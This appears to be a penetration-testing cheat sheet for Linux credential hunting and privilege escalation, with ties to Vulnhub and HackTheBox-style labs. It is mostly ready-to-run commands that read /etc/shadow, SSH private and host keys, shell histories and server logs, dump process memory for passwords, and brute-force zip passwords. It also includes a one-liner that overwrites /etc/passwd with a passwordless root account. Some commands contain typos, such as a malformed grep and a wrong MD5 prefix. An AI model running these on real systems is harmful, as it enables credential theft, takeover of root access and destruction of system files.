## User and Password One-Liners

### Files With "passw" String

```text
find / -type f -readable -size +0 2>/dev/null | grep -Hi passw 
grep -r -l -i -I passw /
```

### Plaintext Usernames or Passwords?

```text
grep -i user [filename] 
grep -i pass [filename] 
grep -C 5 "password" [filename] 
grep -rnw '[directory path to search]' -e '[pattern like password]'
```

* For Joomla
  * Common place for creds is in the confiration.php file usually located at the root of the joomla web server directory or in the installation folder. This file includes database, server, and session settings where credentials could be found.

    ```text
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
    ```
* For Wordpress \(Vulnhub:Zico2\)
  * Common place is the wp-config.php file found at the root directory.

### Files Generally With Plaintext / Easily-Reversible Passwords

```text
less /var/apache2/* 
cat /root/anaconda-ks.cfg 
strings /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```

### Users With No Password Set

```text
cut -f1-2 -d':' /etc/passwd | grep -v ':x$'
```

### Super Users

```text
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' 
awk -F: '($3 == "0") {print}' /etc/passwd
```

## User and Password Hashes

### Background

* /etc/passwd contains users of the machine. If we filter for just the users that have /bin/bash or /bin/sh as their default program upon login, then we can get a list of interactive machine users.

  ```text
  Cat /etc/passwd | grep /bin/bash 
  Cat /etc/passwd | grep /bin/sh 
  grep -vE "nologin" /etc/passwd
  ```

* /etc/shadow has the password hashes and is only readable by root unless it's misconfigured to allow other users to read it.

  **Hash Syntax**

  * First 3 chatcyers identify the algorithm used.  

    ```text
    1$          MD5 
    $2a$        Blowfish 
    $2y$        Blowfish 
    $5$          SHA-256 
    $6$          SHA-512
    ```

  * The next characters are the salt which preceded the next $. 
  * The string after the middle $ is the password hash value.

### Attack Vector

1. Try easy passwords for trying to su to other interactive users.  
2. Display the permissions of the shadow file to see if we or a non-root user can display the hash contents.  Then crack the hash. 
3. Display the permissions of the /etc/ passwd file. If it is writable by the current user then you can overwrite the file to add a new root user without a password required.  

   ```text
   echo root::0:0:root:/root:/bin/bash > /etc/passwd
   ```

   * Usually there's an X after the username to signify a password is required. When it is omitted \(like this example\), you can su to root without a password.

### Passwords in Memory of Running Applications

#### Background

* Credentials can be stored in cleartext in memory of already running applications.
* Access to memory space of running applications is possible when it is within the same user context.

#### Attack Vector

* Write running process memory space to a file.  Then search for credential data. 
* GDB 

  ```text
  #gdb -p <pid>  
  info proc mappings 
  Dump memory <outfile> <start memory region > <stop memory region>
  ```

* GCore 

  ```text
  gcore -o <outfile> <pid>
  ```

### History and Logs

#### Background

* Sometimes credentials can be saved in the history or log files of programs or the OS.

#### Attack Vector

* Bash History
  * Provides history functionality that stores previous bash commands. 
  * Automatically created in user home directory. 

    ```text
    cat  ~/.bash_history
    ```
* Logs
  * Check for file permissions being set incorrectly for logs that we can read.  
  * Common location for logs is

    ```text
    /var/log/
    ```

  * Common direct paths 

    ```text
    cat /etc/httpd/logs/access_log 
    cat /etc/httpd/logs/access.log 
    cat /etc/httpd/logs/error_log 
    cat /etc/httpd/logs/error.log 
    cat /var/log/apache2/access_log 
    cat /var/log/apache2/access.log 
    cat /var/log/apache2/error_log 
    cat /var/log/apache2/error.log 
    cat /var/log/apache/access_log 
    cat /var/log/apache/access.log 
    cat /var/log/auth.log 
    cat /var/log/chttp.log 
    cat /var/log/cups/error_log

    cat /var/log/lighttpd/error.log 
    cat /var/log/lighttpd/lighttpd.access.log 
    cat /var/log/lighttpd/lighttpd.error.log

    cat /var/log/secure 
    cat /var/log/syslog 
    cat /var/log/wtmp 
    cat /var/log/xferlog 
    cat /var/log/yum.log

    cat /var/webmin/miniserv.log 
    cat /var/www/logs/access_log 
    cat /var/www/logs/access.log 
    ls -alh /var/lib/dhcp3/ 
    ls -alh /var/log/postgresql/ 
    ls -alh /var/log/proftpd/ 
    ls -alh /var/log/samba/
    ```

  * Other applications if they're installed 

    ```text
    cat ~/.nano_history 
    cat ~/.atftp_history 
    cat ~/.mysql_history 
    cat ~/.php_history
    ```

### Passwords in Configuration Files

```text
cat /var/apache2/config.inc 
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg 
Grep RiIn passw / 2>/Dev/null
```

* List web server config files  

  ```text
  ls -alR /var/www/ 
  ls -alR /srv/www/htdocs/  
  ls -alR /usr/local/www/apache22/data/ 
  ls -alR /opt/lampp/htdocs/
  ```

### .History Files For Credentials to Re-Use

```text
cat ~/.bash_history 
cat ~/.nano_history 
cat ~/.atftp_history 
cat ~/.mysql_history 
cat ~/.php_history
```

## Private Key Information

```text
cat ~/.ssh/authorized_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id_rsa.pub 
cat ~/.ssh/id_rsa 
cat ~/.ssh/id_dsa.pub 
cat ~/.ssh/id_dsa 
cat /etc/ssh/ssh_config 
cat /etc/ssh/sshd_config 
cat /etc/ssh/ssh_host_dsa_key.pub 
cat /etc/ssh/ssh_host_dsa_key 
cat /etc/ssh/ssh_host_rsa_key.pub 
cat /etc/ssh/ssh_host_rsa_key 
cat /etc/ssh/ssh_host_key.pub 
cat /etc/ssh/ssh_host_key
```

## Password-Protected Zip Files \(ippsec=Node\)

* Sometimes you find zip files that are password protected.  You can brute force this password with fcrackzip.

  ```text
  fcrackzip -D -p [password file] [zip file needing the PW cracked]
  ```
